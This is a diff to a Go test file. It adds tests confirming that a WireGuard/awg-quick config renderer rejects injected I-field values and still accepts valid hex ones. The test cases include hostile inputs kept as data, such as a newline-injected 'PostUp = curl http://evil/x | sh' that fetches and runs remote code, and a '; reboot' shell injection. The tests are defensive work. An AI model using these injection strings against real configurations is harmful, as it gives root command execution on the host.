@@ -173,6 +173,42 @@ func TestRenderConfigRejectsInjectedPrivateKey(t *testing.T) {
 	}
 }
 
+// renderConfig must reject any panel-pushed I1-I5 mimicry value that isn't a
+// plain hex string, closing the same [Interface]/PostUp injection → root-RCE
+// class the WG-key/AllowedIP validators guard against. I-fields are written
+// verbatim into the awg-quick INI, so a newline lets a value inject a PostUp
+// directive that runs as root on `awg-quick up`.
+func TestRenderConfigRejectsInjectedIField(t *testing.T) {
+	cases := []struct {
+		name string
+		i1   string
+	}{
+		{"newline injecting PostUp", "aabb\nPostUp = curl http://evil/x | sh"},
+		{"shell metachar", "aabb; reboot"},
+		{"space then directive", "aabb ListenPort = 9"},
+		{"non-hex letter", "aabbzz"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			cfg := validInbound()
+			cfg.I1 = tc.i1
+			if _, err := renderConfig(cfg, nil); err == nil {
+				t.Errorf("expected validation error for malicious I1 value")
+			}
+		})
+	}
+}
+
+// A well-formed hex I-value (and empty = disabled) must still render.
+func TestRenderConfigAcceptsHexIField(t *testing.T) {
+	cfg := validInbound()
+	cfg.I1 = "b0000000c1600000456"
+	cfg.I5 = ""
+	if _, err := renderConfig(cfg, nil); err != nil {
+		t.Errorf("valid hex I-field rejected: %v", err)
+	}
+}
+
 func TestRenderConfigPropagatesValidationError(t *testing.T) {
 	bad := validInbound()
 	bad.PrivateKey = ""
